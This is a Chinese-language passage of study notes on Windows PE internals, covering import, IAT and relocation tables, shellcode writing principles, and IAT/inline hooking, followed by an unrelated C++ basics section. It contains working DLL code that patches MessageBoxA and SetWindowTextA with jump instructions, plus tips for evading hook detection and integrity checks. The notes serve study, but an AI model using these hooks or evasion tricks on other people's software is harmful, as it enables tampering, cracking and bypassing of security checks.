<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B8 C0 04 00 00 00 00 00 00 00 00 00 0A C2 04 00 E0 D4 03 00</span><br><span class="line">D8 BB 04 00 00 00 00 00 00 00 00 00 2C C3 04 00 00 D0 03 00</span><br><span class="line">18 C1 04 00 00 00 00 00 00 00 00 00 A2 C3 04 00 40 D5 03 00</span><br><span class="line">48 BC 04 00 00 00 00 00 00 00 00 00 1A CA 04 00 70 D0 03 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>以下是导入表的结构，倒数第二个成员是一个字符串，存储的是依赖模块的地址，从这个RVA地址一直找到00结束</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        DWORD OriginalFirstThunk; ``<span class="comment">// RVA，指向IMAGE_THUNK_DATA结构数组</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD TimeDateStamp; ``<span class="comment">// 时间戳</span></span><br><span class="line">        DWORD ForwarderChain;</span><br><span class="line">    DWORD Name; ``<span class="comment">// RVA，表示依赖模块名字的地址，这是一串字符串</span></span><br><span class="line">        DWORD FirstThunk; ``<span class="comment">// RVA，指向IMAGE_THUNK_DATA结构数组</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/03/20/PE/image-20240516090158390.png" alt="image-20240516090158390"></p>
<p>所以，第一个依赖的模块就是USER32.dll</p>
<p><img src="/2024/03/20/PE/image-20240516090423249.png" alt="image-20240516090423249"></p>
<p>第二个模块是ADVAPI32.dll</p>
<p><img src="/2024/03/20/PE/image-20240516090556137.png" alt="image-20240516090556137"></p>
<p>第三个模块是ale32.dll</p>
<p><img src="/2024/03/20/PE/image-20240516090703665.png" alt="image-20240516090703665"></p>
<p>第四个模块是KERNEL32.dll</p>
<p><img src="/2024/03/20/PE/image-20240516090944739.png" alt="image-20240516090944739"></p>
<h3 id="导入表——确定依赖函数"><a href="#导入表——确定依赖函数" class="headerlink" title="导入表——确定依赖函数"></a>导入表——确定依赖函数</h3><p>在确定这个PE文件依赖那些导入表之外，还要确定这个PE文件依赖哪些函数。</p>
<p>在导入表结构体中，OriginalFirstThunk指向一个<strong>INT</strong>(Import Name Table)导入名称表，FirstThunk指向一个IAT(Import Address Table)导入地址表。</p>
<p><img src="/2024/03/20/PE/image-20240516091514313.png" alt="image-20240516091514313"></p>
<p>观察这两张表，这两张表指向不同的（地址不同）两张表，但是两者的内容一样。因此通过两个成员都能够找到当前所依赖模块中的函数。因此任选择一个成员去找依赖函数即可。</p>
<p>第一个成员指向的就是一个<strong>INT</strong>，结构体如下表，这个结构体中只有一个联合体，它的宽度就是四字节：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_THUNK_DATA32</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PBYTE ForwarderString;</span><br><span class="line">        PDWORD Function;</span><br><span class="line">        DWORD Ordinal; ``<span class="comment">// 序号</span></span><br><span class="line">            PIMAGE_IMPORT_BY_NAME AddressOfData; ``<span class="comment">// 指向IMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>

<p><strong>INT</strong>中有很多个这种结构体，他与导入表一样，当遇到与这个结构体宽度相同的一段0x00时，就代表这个表结束了。同时在这里面发现的结构体的数量就代表依赖模块的函数数量。</p>
<p><img src="/2024/03/20/PE/image-20240516152559528.png" alt="image-20240516152559528"></p>
<h3 id="导入表——确定依赖地址"><a href="#导入表——确定依赖地址" class="headerlink" title="导入表——确定依赖地址"></a>导入表——确定依赖地址</h3><p>在静态PE文件中，<strong>INT</strong>和<strong>IAT</strong>两张表的结构内容是一样的：</p>
<p><img src="/2024/03/20/PE/image-20240516202442765.png" alt="image-20240516202442765"></p>
<p>但是，当PE文件加载之后，IAT就发生了变化，它里面直接储存了函数的地址：</p>
<p><img src="/2024/03/20/PE/image-20240516202548298.png" alt="image-20240516202548298"></p>
<p>当程序在使用依赖模块的函数时，实际上是间接调用，比如调用MessageBoxA函数时，汇编指令不是直接call地址，而是从内存中找到这个地址再call：</p>
<p><img src="/2024/03/20/PE/image-20240516202749490-1720116192893-2.png" alt="image-20240516202749490"></p>
<p>而这一块内存就是IAT中存储的函数地址：</p>
<img src="/2024/03/20/PE/image-20240516202815003.png" alt="image-20240516202815003" style="zoom:50%;">

<p>为什么不只留一张表：因为IAT的函数地址很有可能被修改掉，导致地址不正确，如果只有一张表的话，就没有一个正确的参照物了。</p>
<h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>PE文件中最重要的三张表：导出表、导入表、重定位表</p>
<p>假设某个PE文件使用了一些模块，这些模块都有自己的ImageBase（内存中开始的地址），但实际上在内存中模块的ImageBase被别人占用了，<strong>这时候模块就需要偏移，换一个新的内存地址去展开，</strong>假设在这个模块中有很多已经写好了的地址硬编码（<strong>但凡涉及直接寻址的指令都需要进行重定位处理</strong>），当换了地址之后就找不到了，甚至会出现安全隐患，所以硬编码的地址是需要随着偏移而去修改的，<strong>这时候就需要一张表去记录需要修正的位置，便于去根据对应偏移修正，这张表就称为重定位表；</strong>一般来说，<strong>exe文件是没有重定位表的，</strong>因为他一般不会提供函数给别人用（导出表），所以运行时它理应是第一个载入内存中的，而DLL之类的PE文件则一定是需要重定位表的，因为它并不一定会加载在ImageBase上。</p>
<blockquote>
<p>当一个进程的内存空间中放进了一个A模块，占用了0x100000-0x1FFFFF的地址，但是本来B模块应该被放在这里，而这里已经被A模块占用，所以B模块只能放到A的后面，从0x200000开始。恰好B进程中有一个<code>x = 0x11</code>：</p>
</blockquote>
<blockquote>
<p><img src="/2024/03/20/PE/image-20240517150718844.png" alt="image-20240517150718844"></p>
</blockquote>
<blockquote>
<p>这里的B模块一旦没有占住它原来的这一段内存，这里的硬编码就会失效，导致程序没法正确的给x赋值。</p>
<p>因此这就需要用重定位表来修正。</p>
<p>重定位表中要记录的就是这些需要修正的地方的地址。</p>
<p>所以有了重定位表，就不用担心这段程序如果没占住他的ImageBase会不会出问题</p>
</blockquote>
<p><img src="/2024/03/20/PE/image-20240517152658313.png" alt="image-20240517152658313"></p>
<p>重定位表的位置信息与导入表、导出表一样，在扩展PE头最后一个成员中的第6个结构体，结构体的成员与导入表、导出表一样，分别表示重定位表的RVA和Size</p>
<img src="/2024/03/20/PE/image-20240516205416126.png" alt="image-20240516205416126" style="zoom:65%;">

<p>重定位表中有一个结构体，它一共有8字节：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_BASE_RELOCATION</span> &#123;</span><br><span class="line">    DWORD VirtualAddress; ``<span class="comment">// RVA</span></span><br><span class="line">    DWORD SizeOfBlock;</span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION ，* PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure>

<p>但是完整的重定位表还包含了很多重定位项，所以整体大小是没有一个统一标准的，需要根据实际情况。该结构体的第一个成员VirtualAddress表示基地址，<strong>第二个成员SizeOfBlock也就是减去当前结构体的大小之后其他的所有重定位项加起来的大小。</strong></p>
<p>这也就表示每一个重定位表是IMAGE_BASE_RELOCATION结构体开始，跟着的就是重定位项。</p>
<p>从理论上来说，重定位表中存储的项应该都是4字节大小的地址，但是这样一旦需要修改的地址多了，就会占用大量的空间，所以重定位表就做了一些优化，假设你现在有这几个地址需要修正：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x800123</span><br><span class="line">0x800456</span><br><span class="line">0x800789</span><br></pre></td></tr></table></figure>

<p>那么优化之后，IMAGE_BASE_RELOCATION结构体的第一个成员存储的就是0x800000，而这个结构体之后的每2字节存储就包含0x123、0x456、0x789，这样就大大的节省了空间。同时，这也就说明重定位表的实际大小为IMAGE_BASE_RELOCATION结构体（8字节）+N*2字节。</p>
<p>重定位表是按照一个物理页（4KB）进行存储的，也就表示一个4KB内存有需要修正的位置，就会有一个重定位块，一个重定位表只管自己当前的物理页的重定位。</p>
<p>但需要注意的是由于内存对齐的缘故，在重定位表中还是有很多的无用项的，<strong>所以需要判断当前重定位项（2字节）的高四位是否为3，如果是那么低12位就是偏移量，最后的地址也就是VirtualAddress+低12位，如果不是就表示这是无所谓的值。</strong></p>
<h2 id="PE实践"><a href="#PE实践" class="headerlink" title="PE实践"></a>PE实践</h2><h3 id="注入ShellCode"><a href="#注入ShellCode" class="headerlink" title="注入ShellCode"></a>注入ShellCode</h3><p>什么事ShellCode？不依赖环境，放到任何地方都可以执行的机器码。如果机器码具备这个特征，就可以称之为ShellCode。</p>
<p>ShellCode编写原则</p>
<p>&lt;1&gt; 不能有全局变量</p>
<p>&lt;2&gt; 不能使用常量字符串</p>
<p>如果ShellCode中写的是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> Injstr[] = <span class="string">&quot;ShellCode&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这样的代码在反汇编中程序会先把吧ShellCode放到常量区，然后用的时候再将这个字符串的地址复制出来。但是ShellCode不能依赖常量区，所以应该换一种方式直接将这个字符串放到堆栈中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> Injstr[] = &#123;<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>这样写出来的代码在汇编中就会直接放到堆栈中，而不是放在常量区。</p>
<p>&lt;3&gt; 不能使用系统调用</p>
<p>解决方案：</p>
<p>​		FS:[0] -&gt; TEB</p>
<p>​		FS:[0x30] -&gt; PEB</p>
<p>找到PEB后<img src="/2024/03/20/PE/image-20240519090745097.png" alt="image-20240519090745097"></p>
<p>在找到其中的+0xc的位置，找到右边这个结构体，找到右侧这三个链表。</p>
<p><img src="/2024/03/20/PE/image-20240519091248845.png" alt="image-20240519091248845"></p>
<p>这样就可以通过DLL的名字找到自己想要的DLL（Unicode）</p>
<p>比如要找LoadLibrary或者GetProcAddress这两个函数，这两个函数时kernel32,dll里面的函数，所以要找到LoadLibrary要先找到kernel32这个dll</p>
<p>然后可以遍历上面这个结构体，遍历+0x24这个地方如果是kernel32.dll的话，就把+0x18这里的DllBase拿过来，就找到了kernel32.dll模块的基地址</p>
<p>比如LoadLibrary(“user32.dll”)得到一个句柄，这个返回的句柄就是这个模块的基地址。</p>
<p>所以现找TEB，再找PEB，然后找到三个链表，再遍历链表，找到kernel32.dll，找到kernel32.dll了之后还不能直接使用，还要找到这个函数在什么地方</p>
<p>因为PE文件有一张导出表，并且已经找到了kenel32.dll的首地址，所以通过找内存能找到kernel32的导出表，然后通过查询导出表，就能找到需要用的函数。然后只要有了LoadLibrary和GetProcAddress这两个函数，想找到其他的函数就都行了。这样就能做到在自己的函数中不依赖导入表，想用谁就用谁</p>
<p>&lt;4&gt; 不能嵌套调用其他函数</p>
<blockquote>
<p>第二个和第三个其实是可以解决掉的</p>
</blockquote>
<h3 id="HOOK"><a href="#HOOK" class="headerlink" title="HOOK"></a>HOOK</h3><p>什么是HOOK，HOOK是用来获取、更改程序执行时的某些数据，或者是用于更改程序执行流程的一种技术。</p>
<p>HOOK的两种主要形式：</p>
<p>1.该函数代码 -&gt; INLINE HOOK</p>
<p>2.改函数地址<br>IAT HOOK<br>SSDT HOOK<br>IDT HOOK<br>EAT HOOK<br>IRP HOOK<br>……</p>
<p>​							</p>
<h3 id="IAT-HOOK"><a href="#IAT-HOOK" class="headerlink" title="IAT HOOK"></a>IAT HOOK</h3><p>IAT（Import Address Table）导入地址表HOOK。</p>
<p>比如在一个程序中有一个MessageBox，现在使用HOOK将MessageBox中的值改调，或者让这个程序在执行MessageBox的时候执行自己的一个函数，这时候就用IAT HOOK。</p>
<p><img src="/2024/03/20/PE/image-20240519103431074.png" alt="image-20240519103431074"></p>
<p>比如这样一个间接调用，call后面跟的是一个ptr，一块内存。此时可以HOOK将这个内存地址中存储的函数地址改成自己函数的地址。</p>
<p><strong>IAT HOOK步骤：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、在Dll里构造Detour函数(也就是我们自己的函数)</span><br><span class="line">2、获取Target函数地址，并找到Target函数所在的IAT的地址</span><br><span class="line">3、保存原始的IAT地址和IAT地址所存储的内容</span><br><span class="line">4、修改IAT地址中的数据(前提：修改内存属性为可写)</span><br><span class="line">5、恢复IAT</span><br></pre></td></tr></table></figure>



<h3 id="INLINE-HOOK"><a href="#INLINE-HOOK" class="headerlink" title="INLINE HOOK"></a>INLINE HOOK</h3><p>IAT Hook缺点：</p>
<p>&lt;1&gt; 容易被检测到</p>
<p>&lt;2&gt; 只能Hook IAT表里面的函数 -&gt; 有50个WindowsAPI的函数，还有50个自己写的函数，这些自己写的函数就没法Hook，因为自己写的函数在IAT表中是没有的。</p>
<p>INLINE HOOK就是直接修改exe的硬编码。</p>
<p>比如现在有一个程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	a = x + y;</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, plus(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过Hook修改plus()函数执行时，堆栈中的值。使2+3&#x3D; 5。</p>
<p><img src="/2024/03/20/PE/image-20240523102541164.png" alt="image-20240523102541164"></p>
<p>从这个call开始修改，让这里先jmp到0x30194A这里，执行自己的代码</p>
<img src="/2024/03/20/PE/image-20240523102621892.png" alt="image-20240523102621892" style="zoom:50%;">

<p>有三个字节没有被占用，所以用nop填充</p>
<img src="/2024/03/20/PE/image-20240523104330985.png" alt="image-20240523104330985" style="zoom:50%;">

<p>因为jmp跳转之后不会改变esp的值，所以跳完之后直接esp和esp+0x4直接找到两个push进来的值，直接对这两个值进行修改。</p>
<p>修改两个值：<img src="/2024/03/20/PE/image-20240523105118207.png" alt="image-20240523105118207"></p>
<p>因为本来覆盖了一句汇编call 0xxxxxxx所以在这里要把它先填回来。</p>
<p><img src="/2024/03/20/PE/image-20240523105329269.png" alt="image-20240523105329269"></p>
<p>修改完之后再jmp执行回来。</p>
<p>最终改完就是这样<img src="/2024/03/20/PE/image-20240523111015872.png" alt="image-20240523111015872"></p>
<p>执行完后，堆栈中变成了0x3和0x4</p>
<p><img src="/2024/03/20/PE/image-20240523111057776.png" alt="image-20240523111057776"></p>
<p><img src="/2024/03/20/PE/image-20240523111531311.png" alt="image-20240523111531311"></p>
<p>执行后就是0x7</p>
<p>原理是这样，需要用代码来实现。</p>
<p>还是以MessageBoxA来举例。这里HookMessageBoxA这个函数</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD jump = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="type">void</span> <span class="title function_">Transfer</span><span class="params">()</span>&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">		mov edi, edi</span><br><span class="line">		push ebp</span><br><span class="line">		mov ebp, esp</span><br><span class="line">		mov ebx, jump</span><br><span class="line">		jmp ebx</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> APIENTRY <span class="title function_">DllMain</span><span class="params">(HANDLE handle, DWORD dword, LPVOID lpvoid)</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hwnd = GetModuleHandle(TEXT(<span class="string">&quot;user32.dll&quot;</span>));</span><br><span class="line">	DWORD base = (DWORD)GetProcAddress(hwnd, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (VirtualProtect((LPVOID)base, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD value = (DWORD)Transfer - base - <span class="number">5</span>;</span><br><span class="line">		jump = base + <span class="number">0x1a</span>;</span><br><span class="line">		__asm&#123;</span><br><span class="line">			mov eax, base</span><br><span class="line">			mov byte ptr[eax], <span class="number">0xe9</span></span><br><span class="line">			inc eax</span><br><span class="line">			mov ebx, value</span><br><span class="line">			mov dword ptr[eax], ebx</span><br><span class="line">		&#125;</span><br><span class="line">		VirtualProtect((LPVOID)base, <span class="number">5</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再比如hook修改MessageBoxA的标题：</p>
<p>MessageBoxA在设置窗口标题时会使用SetWindowTextA这个API函数，可以通过Hook这个函数，并修改这个函数调用时的值，从而实现指定窗口的标题，</p>
<p>代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD jump = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="type">bool</span> _stdcall <span class="title function_">Transfer</span><span class="params">(HWND hwnd, LPCSTR lpString)</span>&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">		mov edi, edi</span><br><span class="line">		push ebp</span><br><span class="line">		mov ebp, esp</span><br><span class="line">		mov ebx, jump</span><br><span class="line">		jmp ebx</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> __stdcall <span class="title function_">MySetWindowTextA</span><span class="params">(HWND hwnd, LPCSTR lpString)</span>&#123;</span><br><span class="line">	<span class="type">char</span> * lpText = <span class="string">&quot;LyShark 破解版&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> Transfer(hwnd, lpText);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> APIENTRY <span class="title function_">DllMain</span><span class="params">(HANDLE handle, DWORD dword, LPVOID lpvoid)</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hwnd = GetModuleHandle(TEXT(<span class="string">&quot;user32.dll&quot;</span>));</span><br><span class="line">	DWORD base = (DWORD)GetProcAddress(hwnd, <span class="string">&quot;SetWindowTextA&quot;</span>);</span><br><span class="line">	DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (VirtualProtect((LPVOID)base, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD value = (DWORD)MySetWindowTextA - base - <span class="number">5</span>;</span><br><span class="line">		jump = base + <span class="number">5</span>;</span><br><span class="line">		__asm&#123;</span><br><span class="line">			mov eax, base</span><br><span class="line">			mov byte ptr[eax], <span class="number">0xe9</span></span><br><span class="line">			inc eax</span><br><span class="line">			mov ebx, value</span><br><span class="line">			mov dword ptr[eax], ebx</span><br><span class="line">		&#125;</span><br><span class="line">		VirtualProtect((LPVOID)base, <span class="number">5</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/LyShark/p/11692436.html">C&#x2F;C++ Inline Hook 钩子编写技巧 - lyshark - 博客园 (cnblogs.com)</a></p>
<h3 id="INLINE-HOOK-改进版"><a href="#INLINE-HOOK-改进版" class="headerlink" title="INLINE HOOK 改进版"></a>INLINE HOOK 改进版</h3><p>当自己需要写的函数非常复杂的时候，比如想要打印一个字符串，这时候用纯汇编自己编写就非常复杂。所以采用调用函数的方法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MyMessageBox</span><span class="params">(HWND hwnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">	TCHAR szBuffer[<span class="number">0x100</span>];</span><br><span class="line">	<span class="built_in">sprintf</span>(szBuffer,<span class="string">&quot;%x %s %s %x \n&quot;</span>, hwnd, lpText, lpCaption, uType);</span><br><span class="line">	OutputDebugString(szBuffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __declspec(naked) NewMessageBox()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 1.保存寄存器</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">        <span class="comment">// 2.调用处理函数</span></span><br><span class="line">        push DWORD PTR SS:[esp+<span class="number">0x28</span>]</span><br><span class="line">        push DWORD PTR SS:[esp+<span class="number">0x30</span>]</span><br><span class="line">        push DWORD PTR SS:[esp+<span class="number">0x38</span>]</span><br><span class="line">        push DWORD PTR SS:[esp+<span class="number">0x40</span>]</span><br><span class="line">        call MyMessageBox</span><br><span class="line">        add esp, <span class="number">0x10</span></span><br><span class="line">        <span class="comment">// 3.恢复寄存器</span></span><br><span class="line">        popfd</span><br><span class="line">        popad</span><br><span class="line">        <span class="comment">// 4.执行覆盖的代码</span></span><br><span class="line">        mov edi, edi</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        <span class="comment">// 5.返回执行</span></span><br><span class="line">        push dwHookAddress</span><br><span class="line">        add dword ptr ds:[esp], PATCH_LENGTH</span><br><span class="line">        retn</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>INLINE HOOK检测</strong></p>
<p>过E9检测，因为在INLINE Hook中一般使用jmp跳转到某个指定的地方来执行自己的指令，而jmp的机器码就是E9，所以可以改为使用CALL + RET的方法避免E9的检测，不过这也只是最简单的一种检测的攻防。</p>
<h3 id="HOOK攻防"><a href="#HOOK攻防" class="headerlink" title="HOOK攻防"></a>HOOK攻防</h3><p>HOOK攻防常用手段</p>
<p>阶段一：</p>
<p>​		（防）检测JMP(E9)、检测跳转范围</p>
<p>​		（破）绕</p>
<p>阶段二：</p>
<p>​		（防）写一个进程，对自己的代码进行全代码校验、CRC校验</p>
<p>​		（破）修改监测代码、挂起检测函数</p>
<p>阶段三：进程A检测进程B，进程B检测进程C，进程C检测进程D，进程D进行全代码校验。</p>
<p>​		（防）先对相关API全代码校验，多个线程互相检测，并检测线程是否在活动中</p>
<p>​		（破）使用瞬时钩子&#x2F;硬件钩子</p>
<h3 id="瞬时HOOK过检测"><a href="#瞬时HOOK过检测" class="headerlink" title="瞬时HOOK过检测"></a>瞬时HOOK过检测</h3>]]></content>
      <categories>
        <category>PE</category>
      </categories>
      <tags>
        <tag>PE</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>c++</title>
    <url>/2024/02/28/c-1/</url>
    <content><![CDATA[<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><h3 id="封装-1"><a href="#封装-1" class="headerlink" title="封装"></a>封装</h3><p>将函数定义到结构体内部，就是封装</p>
<h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>带有函数的结构体称为类</p>
<h3 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h3><p>结构体里面的函数，称为成员函数</p>
<h3 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h3><p>当在一个类中，有一个成员函数</p>
<span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MyStruct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">	<span class="type">int</span> c;</span><br><span class="line">	<span class="type">int</span> d;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d)</span></span><br><span class="line">	&#123;</span><br><span class="line">		a = a;</span><br><span class="line">		b = b;</span><br><span class="line">		c = c;</span><br><span class="line">		d = d;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当用<code>a=a</code>时，编译器不能知道a是参数a还是类中的a。</p>
<p>所以用this关键字</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MyStruct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">	<span class="type">int</span> c;</span><br><span class="line">	<span class="type">int</span> d;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d)</span></span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;a = a;</span><br><span class="line">		this-&gt;b = b;</span><br><span class="line">		this-&gt;c = c;</span><br><span class="line">		this-&gt;d = d;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为this关键字指向的是结构体的首地址，所以this-&gt;a就指的是这个成员函数所在的类中的一个成员变量，而不是成员函数中的参数</p>
<p>总结：1.this指针时编译器默认传入的，通常会使用ECX寄存器进行传递</p>
<p>2.成员函数都有this指针，无论是否使用，都会有这个指针</p>
<p>3.this指针不能做加减运算，也不能被重新赋值</p>
<p>4.this指针不占用结构体的宽度</p>
<h2 id="构造函数与析构函数"><a href="#构造函数与析构函数" class="headerlink" title="构造函数与析构函数"></a>构造函数与析构函数</h2><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>构造函数不能有返回值，构造函数的名字跟类名相同</p>
<p>有构造函数时，当创建一个对象时，构造函数会直接被调用</p>
<p><strong>总结：</strong></p>
<p>1.与类名同名并且没有返回值</p>
<p>2.创建对象时执行，主要用于初始化</p>
<p>3.可以有多个相同的构造函数，最好是有一个无参的，称为函数重载，其他的函数也可以重载</p>
<p>4.编译器不需求必须提供，但是提供时必须不能加返回值</p>
<h3 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h3><p>析构函数也不允许写返回值类型，析构函数只能写一个，不能重载，并且必须无参，不能带参数</p>
<p>构造函数是创建对象的时候执行，而析构函数是当这个对象被销毁时才执行<br>也就是当函数要return返回值时，析构函数会被执行</p>
<p><strong>总结：</strong></p>
<p>1.只能有一个析构函数，不能重载</p>
<p>2.不能带任何参数</p>
<p>3.不能带返回值</p>
<p>4.主要用于清理工作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="type">int</span> level;</span><br><span class="line">	<span class="type">char</span>* arr;</span><br><span class="line">	</span><br><span class="line">	Person(<span class="type">int</span> age, <span class="type">int</span> level)</span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;age = age;</span><br><span class="line">		this-&gt;level = level;</span><br><span class="line">		arr = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	~Person()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;析构函数执行了...&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(arr)</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 其他函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

